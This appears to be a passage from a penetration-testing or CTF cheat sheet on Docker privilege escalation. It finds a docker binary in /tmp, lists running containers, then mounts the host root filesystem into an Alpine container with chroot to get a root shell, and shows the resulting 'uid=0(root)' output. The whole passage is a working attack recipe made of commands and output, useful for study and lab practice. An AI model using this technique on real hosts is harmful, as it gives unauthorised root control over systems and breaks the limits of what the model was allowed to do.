- - -

#### Locate docker ( Try to find all common locations )
 
```sh
ls -lh /tmp
-rwxr-xr-x 1 root userX 86M Jan 12 16:39 docker*
```

```sh
/tmp/docker ps

CONTAINERID    IMAGE     COMMAND               CREATED         STATUS        PORTS                      NAMES

ec96850005d6   mangoman  "/usr/sbin/sshd -D"   3 weeks ago     Up 2 hours    127.0.0.1:2222->22/tcp     kronstadt_industrie

```

Note your Docker **image name** :

```sh
cd /tmp ; sudo ./docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

```sh
 id
uid=0(root) gid=0(root) groups=0(root)
```

- - -

